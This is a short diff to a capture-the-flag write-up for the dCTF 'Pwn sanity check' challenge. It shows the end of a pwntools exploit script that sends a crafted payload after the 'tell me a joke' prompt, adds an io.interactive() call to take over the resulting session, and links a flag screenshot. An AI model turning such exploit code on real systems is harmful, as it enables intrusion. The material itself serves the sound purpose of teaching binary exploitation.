@@ -81,6 +81,7 @@ payload = flat({
 
 write('payload1', payload)
 io.sendlineafter("tell me a joke\n", payload)
+io.interactive()
 ```
 
 ![flag](https://github.com/vietd0x/VietAT16-Task_KCSC/blob/master/dCTF/pwn/Pwn%20sanity%20check/imgs/flag.png?raw=true)
